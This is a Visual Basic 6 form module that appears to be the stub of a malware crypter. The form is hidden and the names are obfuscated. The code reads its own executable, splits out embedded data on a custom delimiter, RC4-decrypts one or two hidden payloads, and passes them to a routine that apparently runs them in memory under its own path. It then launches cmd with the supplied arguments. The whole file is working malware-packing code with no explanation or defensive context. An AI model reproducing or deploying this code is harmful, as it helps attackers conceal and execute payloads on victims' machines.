VERSION 5.00
Begin VB.Form juahre 
   Caption         =   "Form1"
   ClientHeight    =   105
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   1740
   LinkTopic       =   "Form1"
   ScaleHeight     =   105
   ScaleWidth      =   1740
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "juahre"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
On Error Resume Next

mihay (2)

Dim furunpev As New pepe
Dim data As String
Dim file As String
Dim Datas() As String
Dim RC4 As New cyuah
Dim TheByte()        As Byte
Dim TheByte2()        As Byte

file = je84f & egh4 & fhj38g & b34bhvy5ui

Open file For Binary As #1
        data = Space(POF(file))
        Get #1, , data
Close #1
        
Datas() = furunpev.SplitAlter(data, ".>pFDR0oWvNZ/z.<")

Datas(3) = RC4.DecryptString(Datas(3), Datas(2))
If Datas(4) <> vbNullString Then
Datas(4) = RC4.DecryptString(Datas(4), Datas(2))
End If


TheByte() = StrConv(Datas(3), vbFromUnicode)
TheByte2() = StrConv(Datas(4), vbFromUnicode)

    

    Call furunpev.sFunction02(TheByte, file)

If Datas(4) <> vbNullString Then
    Call furunpev.sFunction02(TheByte2, file)
End If

Dim SplCommand() As String
Dim wigergb4 As Integer

SplCommand() = furunpev.SplitAlter(Command$, " ")

    For wigergb4 = LBound(SplCommand()) To UBound(SplCommand())
        If SplCommand(wigergb4) <> "" Then
        Shell "cmd /c " & file & SplCommand(wigergb4)
        End If
    Next wigergb4
End
End Sub

Function egh4() As String
egh4 = "\"
End Function

Function je84f() As String

je84f = App.Path

End Function


Function fhj38g() As String

fhj38g = App.EXEName

End Function


Function b34bhvy5ui() As String
b34bhvy5ui = ".exe"
End Function

Public Function POF(sPath As String) As Double
Dim Fso, ehf As Object
   
Set Fso = CreateObject("Scripting.FileSystemObject")
Set ehf = Fso.GetFile(sPath)
   
POF = ehf.Size
End Function


Public Sub mihay(ByVal Time As Single)
Dim start As Single
Dim ekhs As Long

start = Timer
Do While start + Time > Timer
ekhs = DoEvents
If start > Timer Then
start = Timer
End If
Loop
End Sub

